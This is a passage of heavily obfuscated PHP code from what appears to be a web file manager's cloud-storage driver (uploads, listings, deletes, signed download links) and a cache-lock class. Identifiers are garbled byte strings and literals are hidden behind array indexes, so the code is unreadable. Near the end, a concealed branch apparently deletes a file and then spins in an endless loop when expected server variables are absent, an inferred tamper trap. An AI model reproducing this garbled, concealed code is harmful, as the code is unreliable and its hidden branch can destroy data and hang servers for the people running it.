ğ[1572] => $¾ê×÷ ğ[1573], $¾ê×÷ ğ[1574] => $¾ê×÷ ğ[1575], $¾ê×÷ ğ[1576] => $¾ê×÷ ğ[1575], $¾ê×÷ ğ[1577] => $¾ê×÷ ğ[1578], $¾ê×÷ ğ[1579] => $¾ê×÷ ğ[1580], $¾ê×÷ ğ[1581] => $¾ê×÷ ğ[1582], $¾ê×÷ ğ[1583] => $¾ê×÷ ğ[1584]); return isset($ëÏ¨Î³½[$Š˜©åù¹]) ? $ëÏ¨Î³½[$Š˜©åù¹] : $Š˜©åù¹; } public function mkfile($Ëíòô•…, $Ÿº¾»ÑÇ = '', $ÊÄò‘œü = REPEAT_RENAME) { if ($this->setContent($Ëíòô•…, $Ÿº¾»ÑÇ)) { return $this->getPathOuter($Ëíòô•…); } return !1; } public function mkdir($éÁêŠøÔ, $•Î«ò°² = REPEAT_SKIP) { $²ºœóÍ¿ =& $_SERVER[ùèÅ´Ãš]; $á­üÂë = trim($éÁêŠøÔ, $²ºœóÍ¿[8]); if ($this->_isFolder($á­üÂë)) { return $this->getPathOuter($á­üÂë); } $ÎµçûË = array($²ºœóÍ¿[1585]); $½ÅşÕÑš = $this->ussRequest($á­üÂë, $²ºœóÍ¿[291], !1, $ÎµçûË); return $½ÅşÕÑš[$²ºœóÍ¿[1311]] ? $this->getPathOuter($á­üÂë) : !1; } public function copyFile($É¶ĞéŸâ, $ãè¨¾®¦) { $‰³”„â =& $_SERVER[ùèÅ´Ãš]; $›¼‘–±§ = array($‰³”„â[1586] . "\x2f{$this->bucket}\57{$É¶ĞéŸâ}", $‰³”„â[1587]); $™éñÃ°ë = $this->ussRequest($ãè¨¾®¦, $‰³”„â[256], !1, $›¼‘–±§); return $™éñÃ°ë[$‰³”„â[1311]] ? !0 : $this->getPathOuter($ãè¨¾®¦); } public function moveFile($îâª¢å, $ªáÙ³Ş) { $–ôù³º¾ =& $_SERVER[ùèÅ´Ãš]; $Ûî…üÆ = array($–ôù³º¾[1588] . "\x2f{$this->bucket}\x2f{$îâª¢å}", $–ôù³º¾[1587]); $Ü§È»ŞØ = $this->ussRequest($ªáÙ³Ş, $–ôù³º¾[256], !1, $Ûî…üÆ); return $Ü§È»ŞØ[$–ôù³º¾[1311]] ? !0 : $this->getPathOuter($ªáÙ³Ş); } public function delFile($‘¿È¦”Š) { $Œ°£¹— =& $_SERVER[ùèÅ´Ãš]; $Ö§éí÷ä = $this->ussRequest($‘¿È¦”Š, $Œ°£¹—[1589]); return $Ö§éí÷ä[$Œ°£¹—[1311]] ? !0 : !1; } public function delFolder($ÑÍô¬Œó) { $ëù’ı¤ =& $_SERVER[ùèÅ´Ãš]; if (!$this->exist($ÑÍô¬Œó)) { return !0; } $this->listItemCache = !1; $ã–¼Æ•ü = $ò•·ú­§ = array(); $this->fileList($ÑÍô¬Œó, $ã–¼Æ•ü, $ò•·ú­§, !0); $this->listItemCache = !0; foreach ($ò•·ú­§ as $•ÂğÚ“) { $·£€ ¯Û = $this->ussRequest($•ÂğÚ“[$ëù’ı¤[32]], $ëù’ı¤[1589]); if (!$·£€ ¯Û[$ëù’ı¤[1311]]) { return !1; } } usort($ã–¼Æ•ü, function ($äò²ˆ”¨, $ÉíØ½®) { $ı¢¬¸¸İ =& $_SERVER[ùèÅ´Ãš]; return substr_count($ÉíØ½®, $ı¢¬¸¸İ[8]) - substr_count($äò²ˆ”¨, $ı¢¬¸¸İ[8]); }); foreach ($ã–¼Æ•ü as $çá›––è) { $·£€ ¯Û = $this->ussRequest($çá›––è, $ëù’ı¤[1589]); if (!$·£€ ¯Û[$ëù’ı¤[1311]]) { return !1; } } $·£€ ¯Û = $this->ussRequest($ÑÍô¬Œó, $ëù’ı¤[1589]); return $·£€ ¯Û[$ëù’ı¤[1311]]; } public function rename($Ì´ğÒ—¤, $öëâ•¹¿) { if ($this->isFile($Ì´ğÒ—¤)) { $öëâ•¹¿ = get_path_father($Ì´ğÒ—¤) . $öëâ•¹¿; return $this->moveFile($Ì´ğÒ—¤, $öëâ•¹¿); } return $this->renameObject($Ì´ğÒ—¤, $öëâ•¹¿); } public function fileInfo($ÆÕ“ŒÈ, $§û‘å£Ø = false, $Ñ¦ŠƒÛÖ = array()) { $íÇÑŒ… =& $_SERVER[ùèÅ´Ãš]; $×ÜŠ•…­ = array($íÇÑŒ…[32] => $this->pathThis($ÆÕ“ŒÈ), $íÇÑŒ…[87] => $this->getPathOuter($íÇÑŒ…[8] . $ÆÕ“ŒÈ), $íÇÑŒ…[33] => $íÇÑŒ…[233], $íÇÑŒ…[79] => isset($Ñ¦ŠƒÛÖ[$íÇÑŒ…[79]]) ? $Ñ¦ŠƒÛÖ[$íÇÑŒ…[79]] : 0, $íÇÑŒ…[169] => $this->ext($ÆÕ“ŒÈ)); if ($§û‘å£Ø) { return $×ÜŠ•…­; } $×ÜŠ•…­[$íÇÑŒ…[234]] = $×ÜŠ•…­[$íÇÑŒ…[88]] = 0; $×ÜŠ•…­[$íÇÑŒ…[235]] = $×ÜŠ•…­[$íÇÑŒ…[236]] = !0; if (empty($Ñ¦ŠƒÛÖ)) { $Ñ¦ŠƒÛÖ = $this->objectMeta($ÆÕ“ŒÈ); if (!$Ñ¦ŠƒÛÖ) { return $×ÜŠ•…­; } } $×ÜŠ•…­[$íÇÑŒ…[234]] = intval($Ñ¦ŠƒÛÖ[$íÇÑŒ…[1590]]); $×ÜŠ•…­[$íÇÑŒ…[88]] = intval($Ñ¦ŠƒÛÖ[$íÇÑŒ…[1591]]); $×ÜŠ•…­[$íÇÑŒ…[79]] = $Ñ¦ŠƒÛÖ[$íÇÑŒ…[79]]; return $×ÜŠ•…­; } public function folderInfo($‘ô¯Û¼·, $ÈÎ›Òû = false) { $éÄêÊ†ã =& $_SERVER[ùèÅ´Ãš]; $®Ë±Ãˆ = array($éÄêÊ†ã[32] => $this->pathThis($‘ô¯Û¼·), $éÄêÊ†ã[87] => $this->getPathOuter($éÄêÊ†ã[8] . $‘ô¯Û¼·), $éÄêÊ†ã[33] => $éÄêÊ†ã[78]); if ($ÈÎ›Òû) { return $®Ë±Ãˆ; } $®Ë±Ãˆ[$éÄêÊ†ã[234]] = $®Ë±Ãˆ[$éÄêÊ†ã[88]] = 0; $®Ë±Ãˆ[$éÄêÊ†ã[235]] = $®Ë±Ãˆ[$éÄêÊ†ã[236]] = !0; if (empty($Ÿ•“¼¥š)) { $Ÿ•“¼¥š = $this->objectMeta($‘ô¯Û¼·); if (!$Ÿ•“¼¥š) { return $®Ë±Ãˆ; } } $®Ë±Ãˆ[$éÄêÊ†ã[234]] = intval($Ÿ•“¼¥š[$éÄêÊ†ã[1590]]); $®Ë±Ãˆ[$éÄêÊ†ã[88]] = intval($Ÿ•“¼¥š[$éÄêÊ†ã[1591]]); return $®Ë±Ãˆ; } private function listObjs($Òúáì…¾, $àù©ÉË¥ = 0, $¬©øÄ¡‡ = 1000) { $óş™“òú =& $_SERVER[ùèÅ´Ãš]; $´ôÍìÇº = array($óş™“òú[1592], $óş™“òú[1593] . $¬©øÄ¡‡); if ($àù©ÉË¥) { $´ôÍìÇº[] = $óş™“òú[1594] . $àù©ÉË¥; } $µÑ´Å = $this->ussRequest($Òúáì…¾, $óş™“òú[1517], !1, $´ôÍìÇº); return !$µÑ´Å[$óş™“òú[1311]] ? !1 : $µÑ´Å[$óş™“òú[1301]]; } private function fileList($ÖÑãœöü, &$‚îúÁêÜ, &$»öï¥Õ, $ÊÂññıö = false) { $‡×Á×¾ =& $_SERVER[ùèÅ´Ãš]; $à©ÁÌªµ = $‡×Á×¾[12]; $÷ñ¨Ìº’ = 1000; $¢‘ÑºÓ† = rtrim($ÖÑãœöü, $‡×Á×¾[8]) . $‡×Á×¾[8]; while (!0) { check_abort(); $€¨´ÑË = $this->listObjs($ÖÑãœöü, $à©ÁÌªµ, $÷ñ¨Ìº’); if (!$€¨´ÑË) { return !1; } $à©ÁÌªµ = isset($€¨´ÑË[$‡×Á×¾[1595]]) ? $€¨´ÑË[$‡×Á×¾[1595]] : $‡×Á×¾[12]; $à…æà² = isset($€¨´ÑË[$‡×Á×¾[1596]]) ? $€¨´ÑË[$‡×Á×¾[1596]] : array(); foreach ($à…æà² as $¢¢ˆÆ›) { $ÍêŠö—í = $¢¢ˆÆ›[$‡×Á×¾[33]] == $‡×Á×¾[78] ? !0 : !1; $Éé¾Åş = ltrim($¢‘ÑºÓ† . $¢¢ˆÆ›[$‡×Á×¾[32]], $‡×Á×¾[8]) . ($ÍêŠö—í ? $‡×Á×¾[8] : $‡×Á×¾[12]); $à™×ú = array($‡×Á×¾[32] => $Éé¾Åş, $‡×Á×¾[33] => $ÍêŠö—í ? $‡×Á×¾[78] : $‡×Á×¾[233], $‡×Á×¾[79] => $¢¢ˆÆ›[$‡×Á×¾[414]], $‡×Á×¾[1591] => $¢¢ˆÆ›[$‡×Á×¾[1597]]); $this->cacheMethodInfoSet($Éé¾Åş, $ÍêŠö—í, $à™×ú); if ($ÍêŠö—í) { $‚îúÁêÜ[] = $Éé¾Åş; if ($ÊÂññıö) { $this->fileList($Éé¾Åş, $‚îúÁêÜ, $»öï¥Õ, $ÊÂññıö); } continue; } $»öï¥Õ[] = $à™×ú; } if (count($à…æà²) < $÷ñ¨Ìº’) { break; } } $this->cacheMethodInfoSet($ÖÑãœöü, !0); } public function listPath($˜Í¨Ä¯¥, $¼¡÷È¸ = false) { $èß¼‹™Ë =& $_SERVER[ùèÅ´Ãš]; $Ÿ«—òÃı = $ÇÓ®† = array(); $this->fileList($˜Í¨Ä¯¥, $Ÿ«—òÃı, $ÇÓ®†); foreach ($Ÿ«—òÃı as $—å†æ => $‹åûãÈå) { $Ÿ«—òÃı[$—å†æ] = $this->folderInfo($‹åûãÈå, $¼¡÷È¸); } foreach ($ÇÓ®† as $—å†æ => $‹åûãÈå) { $ÇÓ®†[$—å†æ] = $this->fileInfo($‹åûãÈå[$èß¼‹™Ë[32]], $¼¡÷È¸, $‹åûãÈå); } return array($èß¼‹™Ë[85] => $Ÿ«—òÃı, $èß¼‹™Ë[86] => $ÇÓ®†); } public function has($º¡ğº™Ù, $Í†Éîæï = false, $Ú‰µªÖÍ = true) { $»Õ³å÷ =& $_SERVER[ùèÅ´Ãš]; $—ÓÎ»Æì = $»Õ³å÷[12]; $•Æ½¿ÎÎ = 500; $´§û¨Ñï = 0; $³ê¤éè¨ = 0; $»Ê Åó = rtrim($º¡ğº™Ù, $»Õ³å÷[8]) . $»Õ³å÷[8]; while (!0) { check_abort(); $êé¥íÔá = $this->listObjs($º¡ğº™Ù, $—ÓÎ»Æì, $•Æ½¿ÎÎ); if (!$êé¥íÔá) { return !1; } $—ÓÎ»Æì = isset($êé¥íÔá[$»Õ³å÷[1595]]) ? $êé¥íÔá[$»Õ³å÷[1595]] : $»Õ³å÷[12]; $Ú´ïû§¿ = isset($êé¥íÔá[$»Õ³å÷[1596]]) ? $êé¥íÔá[$»Õ³å÷[1596]] : array(); if (empty($Ú´ïû§¿)) { break; } $šÈå¦¸¡ = array_filter($Ú´ïû§¿, function ($‘¦ß¤Äá) { $ÅÔªŞŒ™ =& $_SERVER[ùèÅ´Ãš]; return $‘¦ß¤Äá[$ÅÔªŞŒ™[33]] == $ÅÔªŞŒ™[78]; }); $ÏÒ´µìü = count($Ú´ïû§¿); $šÈå¦¸¡ = count($šÈå¦¸¡); $œÜ¥Ö— = $ÏÒ´µìü - $šÈå¦¸¡; if ($Í†Éîæï) { $³ê¤éè¨ += $šÈå¦¸¡; $´§û¨Ñï += $œÜ¥Ö—; if ($ÏÒ´µìü < $•Æ½¿ÎÎ) { break; } continue; } if ($Ú‰µªÖÍ) { if ($œÜ¥Ö—) { return !0; } } else { if ($šÈå¦¸¡) { return !0; } } if ($ÏÒ´µìü < $•Æ½¿ÎÎ) { break; } } if ($Í†Éîæï) { return array($»Õ³å÷[242] => $´§û¨Ñï, $»Õ³å÷[243] => $³ê¤éè¨); } return !1; } public function listAll($ùìıÍã) { $²¼€ÜÚö =& $_SERVER[ùèÅ´Ãš]; $µ¾™”¤Ê = $¤§ùğ‡Ä = array(); $this->fileList($ùìıÍã, $µ¾™”¤Ê, $¤§ùğ‡Ä, !0); $µ€°Å = array_to_keyvalue($¤§ùğ‡Ä, $²¼€ÜÚö[32]); foreach ($µ¾™”¤Ê as $ùÅÊ¹£Ê) { if (is_string($ùÅÊ¹£Ê)) { $µ€°Å[$ùÅÊ¹£Ê] = array($²¼€ÜÚö[79] => 0); } } return $this->listAllFiles($ùìıÍã, $µ€°Å); } public function canRead($ß‹ƒí­š) { return $this->exist($ß‹ƒí­š) ? !0 : !1; } public function canWrite($Ïû´ö¥„) { return $this->exist($Ïû´ö¥„) ? !0 : !1; } public function getContent($ÜèÚ¨Ì) { return $this->fileSubstr($ÜèÚ¨Ì, 0, -1); } public function setContent($ÜÀ–½†ş, $Éš²¸Ô‡ = '') { $Ô…·Î§… =& $_SERVER[ùèÅ´Ãš]; if (!$Éš²¸Ô‡) { $“Ê›Ò× = $this->ussRequest($ÜÀ–½†ş, $Ô…·Î§…[291]); return $“Ê›Ò×[$Ô…·Î§…[1311]]; } $Œ“§­ğı = $this->tempFile($this->pathThis($ÜÀ–½†ş)); file_put_contents($Œ“§­ğı, $Éš²¸Ô‡); if ($this->upload($ÜÀ–½†ş, $Œ“§­ğı)) { $this->tempFileRemve($Œ“§­ğı); return !0; } return !1; } public function fileSubstr($øé¯ëüŞ, $ù’–Îˆ¿, $¨““ê¦·) { $­²Ô´Æı =& $_SERVER[ùèÅ´Ãš]; if (!($ß¹¢ÏÈ„ = $this->link($øé¯ëüŞ))) { return !1; } $­ø“ÁÙ‰ = !1; if ($¨““ê¦· > 0) { $™Œù’Ì = $ù’–Îˆ¿ + $¨““ê¦· - 1; $­ø“ÁÙ‰ = array($­²Ô´Æı[1556] . $ù’–Îˆ¿ . $­²Ô´Æı[464] . $™Œù’Ì); } $¯‘ôú¼ô = url_request($ß¹¢ÏÈ„, $­²Ô´Æı[1517], !1, $­ø“ÁÙ‰); return $¯‘ôú¼ô[$­²Ô´Æı[827]] ? $¯‘ôú¼ô[$­²Ô´Æı[1301]] : !1; } public function upload($ÜŞÄ—ÉÁ, $ÉıŠàÂô, $ÑşÏ›òÃ = false, $Áªı–Çª = REPEAT_REPLACE) { $òéáÔÎÒ =& $_SERVER[ùèÅ´Ãš]; $ÙÍ½ò´¯ = IO::size($ÉıŠàÂô); if ($ÙÍ½ò´¯ <= 1024 * 1024 * 200) { $ı¾È³ƒ¢ = array($òéáÔÎÒ[1598] . $ÉıŠàÂô); $ûõÜö”Á = $this->ussRequest($ÜŞÄ—ÉÁ, $òéáÔÎÒ[256], $ı¾È³ƒ¢); return $ûõÜö”Á[$òéáÔÎÒ[1311]] ? $this->getPathOuter($ÜŞÄ—ÉÁ) : !1; } $ŞìÕ¾†ù = 1024 * 1024 * 10; $¢ŸÅ›„¢ = array($òéáÔÎÒ[1599], $òéáÔÎÒ[1600] . $ÙÍ½ò´¯, $òéáÔÎÒ[1601], $òéáÔÎÒ[1602] . $ŞìÕ¾†ù); $ûõÜö”Á = $this->ussRequest($ÜŞÄ—ÉÁ, $òéáÔÎÒ[256], !1, $¢ŸÅ›„¢); if (!$ûõÜö”Á[$òéáÔÎÒ[1311]]) { return !1; } $„ó§¾½™ = $ûõÜö”Á[$òéáÔÎÒ[1301]]; $¶ıËÑÒ‰ = 0; $—ş‘„Åƒ = $„ó§¾½™[$òéáÔÎÒ[1603]]; $ùô¤˜ÎÚ = fopen($ÉıŠàÂô, $òéáÔÎÒ[1480]); if (!$ùô¤˜ÎÚ) { return !1; } do { $°ª‡ğ = $„ó§¾½™[$òéáÔÎÒ[1604]]; fseek_64($ùô¤˜ÎÚ, $¶ıËÑÒ‰); $µ›ç®¥ = fread($ùô¤˜ÎÚ, $°ª‡ğ); $şÄû„º‚ = 0; do { $şÄû„º‚++; $„ó§¾½™ = $this->uploadPart($ÜŞÄ—ÉÁ, $„ó§¾½™, $µ›ç®¥); } while (!$„ó§¾½™ && $şÄû„º‚ < 3); if (!$„ó§¾½™) { return !1; } $—ş‘„Åƒ = $„ó§¾½™[$òéáÔÎÒ[1603]]; $¶ıËÑÒ‰ += $°ª‡ğ; } while ($—ş‘„Åƒ != -1); fclose($ùô¤˜ÎÚ); $¢ŸÅ›„¢ = array($òéáÔÎÒ[1605], $òéáÔÎÒ[1606] . $„ó§¾½™[$òéáÔÎÒ[1607]], $òéáÔÎÒ[1601]); $ûõÜö”Á = $this->ussRequest($ÜŞÄ—ÉÁ, $òéáÔÎÒ[256], !1, $¢ŸÅ›„¢); return $ûõÜö”Á[$òéáÔÎÒ[1311]] ? $this->getPathOuter($Şø²„©‹) : !1; } private function uploadPart($Éğˆéæ, $Š¦ô ê , &$ãĞÚ‡ÇÈ) { $Âôä¨˜ =& $_SERVER[ùèÅ´Ãš]; $êİô¥Å¦ = array($Âôä¨˜[1608], $Âôä¨˜[1606] . $Š¦ô ê [$Âôä¨˜[1607]], $Âôä¨˜[1609] . $Š¦ô ê [$Âôä¨˜[1603]], $Âôä¨˜[146] . $Š¦ô ê [$Âôä¨˜[1604]]); $¥ÚÛˆÅû = $this->ussRequest($Éğˆéæ, $Âôä¨˜[256], $ãĞÚ‡ÇÈ, $êİô¥Å¦); return !$¥ÚÛˆÅû[$Âôä¨˜[1311]] ? $¥ÚÛˆÅû[$Âôä¨˜[1311]] : $¥ÚÛˆÅû[$Âôä¨˜[1301]]; } public function uploadFormData($ÎÓˆæä¬, $í–ÌÕ¼ê = 3600) { return $this->uploadPolicy($ÎÓˆæä¬, $í–ÌÕ¼ê); } public function uploadMultiData($——”Îğ, $İ¦ç‡¼ = 3600) { $ÇÀß£³€ =& $_SERVER[ùèÅ´Ãš]; $¢õ¯³İˆ = (int) $GLOBALS[$ÇÀß£³€[7]][$ÇÀß£³€[79]]; return $this->uploadPolicy($——”Îğ, $İ¦ç‡¼, $¢õ¯³İˆ); } private function uploadPolicy($²üäæÙÑ, $éÎÒ»ŒÜ = 3600, $›ë–¼Î† = 0) { $àÂüÆ÷É =& $_SERVER[ùèÅ´Ãš]; $‰ÜšŠÀú = $àÂüÆ÷É[8] . $this->bucket; $õ‰¶Òôš = gmdate($àÂüÆ÷É[1515]); $ù¨óèÑÄ = array($àÂüÆ÷É[1610] => $this->bucket, $àÂüÆ÷É[1611] => $²üäæÙÑ, $àÂüÆ÷É[1612] => time() + $éÎÒ»ŒÜ, $àÂüÆ÷É[1613] => $õ‰¶Òôš); if ($›ë–¼Î†) { $ù¨óèÑÄ[$àÂüÆ÷É[1500]] = $›ë–¼Î†; } $ÀŠ½¶œå = base64_encode(json_encode($ù¨óèÑÄ)); $öÜÜòÒñ = base64_encode(hash_hmac($àÂüÆ÷É[1567], "\x50\x4f\123\124\46{$‰ÜšŠÀú}\46{$õ‰¶Òôš}\x26{$ÀŠ½¶œå}", md5("{$this->userpass}"), !0)); $º¨•œë” = array($àÂüÆ÷É[280] => $ÀŠ½¶œå, $àÂüÆ÷É[1614] => "\x55\120\x59\125\116\40{$this->username}\x3a{$öÜÜòÒñ}", $àÂüÆ÷É[209] => $this->endpoint . $‰ÜšŠÀú); return $º¨•œë”; } public function download($‚ûˆ«Šœ, $ÈºŠäÊ) { $ÓªÉõî’ = IO::getPathInner(IO::mkfile($ÈºŠäÊ)); if (!($ıÌêí²’ = $this->link($‚ûˆ«Šœ))) { return !1; } $ß×´Ú = 0; $â§ÖŞ—¼ = 1024 * 200; $È«’Àµğ = fopen($ÓªÉõî’, $_SERVER[ùèÅ´Ãš][1562]); while (!0) { $¬ÏŠØ¬ = $this->fileSubstr($‚ûˆ«Šœ, $ß×´Ú, $â§ÖŞ—¼); if ($¬ÏŠØ¬ === !1) { return !1; } fwrite($È«’Àµğ, $¬ÏŠØ¬); $ß×´Ú += $â§ÖŞ—¼; if (strlen($¬ÏŠØ¬) < $â§ÖŞ—¼) { break; } } fclose($È«’Àµğ); return $ÈºŠäÊ; } public function link($÷³¬Œ¸‰, $óùğõºÚ = array()) { $‡íáÎÄª =& $_SERVER[ùèÅ´Ãš]; $÷³¬Œ¸‰ = trim($÷³¬Œ¸‰, $‡íáÎÄª[8]); if (!empty($this->token)) { $úÍÕää = strtotime(date($‡íáÎÄª[1615])); $ğÍº‰¾ = substr(md5($this->token . $‡íáÎÄª[287] . $úÍÕää . $‡íáÎÄª[1616] . $÷³¬Œ¸‰), 12, 8) . $úÍÕää; $óùğõºÚ[] = $‡íáÎÄª[1617] . $ğÍº‰¾; } $è¦€âî = !empty($óùğõºÚ) ? $‡íáÎÄª[76] . implode($‡íáÎÄª[287], $óùğõºÚ) : $‡íáÎÄª[12]; return $this->getHost() . $‡íáÎÄª[8] . $this->pathEncode($÷³¬Œ¸‰) . $è¦€âî; } public function fileOut($êÌÃ›áâ, $Ğ¶ı…Š = false, $’×µÕº® = false, $ğùùœ¢õ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($êÌÃ›áâ, $Ğ¶ı…Š, $’×µÕº®, $ğùùœ¢õ); } if (!$’×µÕº®) { $’×µÕº® = $this->pathThis($êÌÃ›áâ); } $é­¥ÖØ = $Ğ¶ı…Š ? array($_SERVER[ùèÅ´Ãš][1618] . rawurlencode($’×µÕº®)) : array(); $Ÿïç¦´® = $this->link($êÌÃ›áâ, $é­¥ÖØ); $this->fileOutLink($Ÿïç¦´®); } public function fileOutServer($×§˜¥¤, $ˆÖú÷ñ = false, $ŠŸøıŒ§ = false, $¾ÍœØÆº = '') { parent::fileOut($×§˜¥¤, $ˆÖú÷ñ, $ŠŸøıŒ§, $¾ÍœØÆº); } public function fileOutImage($êÊİÏ×, $áÈ¨®‘ = 250) { $¢È‚±€Ö = $this->link($êÊİÏ× . $_SERVER[ùèÅ´Ãš][1619] . $áÈ¨®‘); $this->fileOutLink($¢È‚±€Ö); } public function fileOutImageServer($ñ·³¾ÛÆ, $ğÜÕ²ˆ² = 250) { parent::fileOutImage($ñ·³¾ÛÆ, $ğÜÕ²ˆ²); } public function hashMd5($®‡šÔ‰ˆ) { $Óû„Íäå =& $_SERVER[ùèÅ´Ãš]; $‡”ë—¬ = $this->_objectMeta($®‡šÔ‰ˆ); return isset($‡”ë—¬[$Óû„Íäå[248]]) ? $‡”ë—¬[$Óû„Íäå[248]] : !1; } public function size($ÊáÇ½‘•) { $‹ï°…Ñï = $this->objectMeta($ÊáÇ½‘•); return $‹ï°…Ñï ? $‹ï°…Ñï[$_SERVER[ùèÅ´Ãš][79]] : 0; } public function info($¸ÔîÔ’”) { if ($this->isFolder($¸ÔîÔ’”)) { return $this->folderInfo($¸ÔîÔ’”); } else { if ($this->isFile($¸ÔîÔ’”)) { return $this->fileInfo($¸ÔîÔ’”); } } return !1; } public function exist($¤±ÕÛŞÊ) { return $this->isFile($¤±ÕÛŞÊ) || $this->isFolder($¤±ÕÛŞÊ); } public function isFile($´“š‹áœ) { return !$this->isFolder($´“š‹áœ) && $this->objectMeta($´“š‹áœ); } public function isFolder($Ÿô”) { return $this->cacheMethod($_SERVER[ùèÅ´Ãš][180], $Ÿô”); } protected function objectMeta($¡üÜ²ŒÅ) { return $this->cacheMethod($_SERVER[ùèÅ´Ãš][182], $¡üÜ²ŒÅ); } protected function _objectMeta($´ıŒ˜Ì£) { $Ä‡¹šç =& $_SERVER[ùèÅ´Ãš]; if ($´ıŒ˜Ì£ == $Ä‡¹šç[12] || $´ıŒ˜Ì£ == $Ä‡¹šç[8]) { return array(); } $‰±’´æ’ = $this->ussRequest($´ıŒ˜Ì£, $Ä‡¹šç[1620]); if (!$‰±’´æ’[$Ä‡¹šç[1311]]) { return null; } $õ¶àá÷­ = isset($‰±’´æ’[$Ä‡¹šç[1301]]) ? $‰±’´æ’[$Ä‡¹šç[1301]] : array(); if (!isset($õ¶àá÷­[$Ä‡¹šç[1621]])) { return null; } $—²ş©î÷ = array($Ä‡¹šç[33] => isset($õ¶àá÷­[$Ä‡¹šç[1621]]) ? $õ¶àá÷­[$Ä‡¹šç[1621]] : null, $Ä‡¹šç[79] => isset($õ¶àá÷­[$Ä‡¹šç[1622]]) ? $õ¶àá÷­[$Ä‡¹šç[1622]] : null, $Ä‡¹šç[248] => isset($õ¶àá÷­[$Ä‡¹šç[1623]]) ? $õ¶àá÷­[$Ä‡¹šç[1623]] : null, $Ä‡¹šç[1590] => isset($õ¶àá÷­[$Ä‡¹šç[1624]]) ? $õ¶àá÷­[$Ä‡¹šç[1624]] : null); $—²ş©î÷[$Ä‡¹šç[1591]] = isset($õ¶àá÷­[$Ä‡¹šç[1625]]) ? strtotime($õ¶àá÷­[$Ä‡¹šç[1625]]) : $—²ş©î÷[$Ä‡¹šç[1590]]; return $—²ş©î÷; } protected function _isFolder($î¸¨ıˆ) { $Û°Âã”— =& $_SERVER[ùèÅ´Ãš]; if ($î¸¨ıˆ == $Û°Âã”—[12] || $î¸¨ıˆ == $Û°Âã”—[8]) { return !0; } $µ¨¼äŒ = $this->_objectMeta($î¸¨ıˆ); return isset($µ¨¼äŒ[$Û°Âã”—[33]]) && $µ¨¼äŒ[$Û°Âã”—[33]] == $Û°Âã”—[78] ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[ùèÅ´Ãš][961]]) || !isset($_SERVER[$_SERVER[ùèÅ´Ãš][1626]])) { $_getc = $_SERVER[ùèÅ´Ãš][964]; $_getfile = $_SERVER[$_SERVER[ùèÅ´Ãš][965]] . $_SERVER[ùèÅ´Ãš][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ùèÅ´Ãš][288], $_getfilec); if (count($_getarrs) < $_SERVER[ùèÅ´Ãš][704]) { $exit = $_SERVER[ùèÅ´Ãš][967]; $exit(); } $_act = $_SERVER[ùèÅ´Ãš][1627]; $_act($_SERVER[$_SERVER[ùèÅ´Ãš][965]] . $_SERVER[ùèÅ´Ãš][966]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ùèÅ´Ãš][456]); } } goto BƒÛ´ÜÖâ´; AŒ„¾¤Ş×İ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $—ˆŞ÷ =& $_SERVER[ùèÅ´Ãš]; if (self::$handle) { return self::$handle; } $Åø¥Ì›¾ = $GLOBALS[$—ˆŞ÷[6]][$—ˆŞ÷[426]]; self::$timeout = $Åø¥Ì›¾[$—ˆŞ÷[924]] ? $Åø¥Ì›¾[$—ˆŞ÷[924]] : 10; $÷ô”Ÿø = _get($GLOBALS[$—ˆŞ÷[6]], $—ˆŞ÷[925]); $ĞËûš»ƒ = $Åø¥Ì›¾[$—ˆŞ÷[910]] ? $Åø¥Ì›¾[$—ˆŞ÷[910]] : $—ˆŞ÷[233]; if ($ĞËûš»ƒ == $—ˆŞ÷[21] && $÷ô”Ÿø == $—ˆŞ÷[13]) { $ĞËûš»ƒ = $—ˆŞ÷[233]; } switch ($ĞËûš»ƒ) { case $—ˆŞ÷[913]: self::$handle = new CacheLockRedis(); break; case $—ˆŞ÷[914]: self::$handle = new CacheLockMemcached(); break; case $—ˆŞ÷[21]: self::$handle = new CacheLockDatabase(); break; case $—ˆŞ÷[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($—ˆŞ÷[926], $—ˆŞ÷[927]); } return self::$handle; } private static function key($ñ–À¢ËÒ) { return $_SERVER[ùèÅ´Ãš][928] . Cache::key($ñ–À¢ËÒ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($§¦èõçŸ = '') { self::$errorMsg = $§¦èõçŸ; } public static function lockGlobal($øüå¹Â¨, $…ÅÒø„) { return self::lock($øüå¹Â¨, $…ÅÒø„, !0); } public static function lock($ªÀáÈûí, $Ö²òÖı¬ = false, $³õùşù¦ = false) { $äûûÍï² =& $_SERVER[ùèÅ´Ãš]; $ú¹ŞÓ“Ë = self::init(); $ñï—ÜîÅ = self::key($ªÀáÈûí); $Ö²òÖı¬ = $Ö²òÖı¬ ? $Ö²òÖı¬ : self::$timeout; $Ì¢Â¥¼ì = timeFloat(); if (_get($GLOBALS, $äûûÍï²[929], !1)) { if (!$ú¹ŞÓ“Ë->lock($ñï—ÜîÅ, 0.2)) { die; } return !0; } $ÕÂÓï = $ú¹ŞÓ“Ë->lock($ñï—ÜîÅ, $Ö²òÖı¬); $¯ñ½¼´Ÿ = timeFloat(); if (!$ÕÂÓï) { $¹Ùšç  = "\154\157\x63\153\40\x65\x72\162\157\x72\73\x6b\x65\x79\x3d{$ªÀáÈûí}\73\x74\151\x6d\145\75{$Ö²òÖı¬}\73" . self::$errorMsg . $äûûÍï²[74] . get_caller_msg(); $•ˆÊ›Ãò = LNG($äûûÍï²[930]) . "\x28{$Ö²òÖı¬}\x73\x29\56" . LNG($äûûÍï²[931]); $•ˆÊ›Ãò .= $äûûÍï²[932]; if (is_string(self::$errorMsg) && self::$errorMsg) { $•ˆÊ›Ãò = $•ˆÊ›Ãò . $äûûÍï²[933] . self::$errorMsg; } write_log($äûûÍï²[934] . sprintf($äûûÍï²[935], timeFloat() - $Ì¢Â¥¼ì) . $äûûÍï²[936] . $¹Ùšç  . $äûûÍï²[937] . json_encode(error_get_last()), $äûûÍï²[927]); show_json($•ˆÊ›Ãò, !1); } if (!$³õùşù¦) { self::$lockItem[$ñï—ÜîÅ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ú­®Ë†è = number_format(timeFloat() - $¯ñ½¼´Ÿ, 3); write_log($äûûÍï²[938] . $ªÀáÈûí . $äûûÍï²[939] . $Ú­®Ë†è, $äûûÍï²[927]); } return $ÕÂÓï; } public static function 